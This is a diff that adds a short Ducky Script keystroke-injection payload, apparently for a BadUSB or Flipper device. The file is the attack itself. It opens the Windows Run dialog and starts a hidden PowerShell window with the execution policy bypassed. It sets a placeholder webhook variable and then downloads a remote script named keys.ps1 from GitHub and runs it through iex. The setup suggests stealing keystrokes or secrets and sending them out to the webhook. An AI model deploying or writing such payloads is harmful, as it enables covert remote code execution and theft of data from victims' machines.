@@ -1,0 +1,4 @@
+GUI r
+DELAY 750
+STRING powershell -NoP -NonI -Exec Bypass -w h -c $dc='webhook_here';irm https://raw.githubusercontent.com/mbeskek/flips/main/keys.ps1 | iex
+ENTER
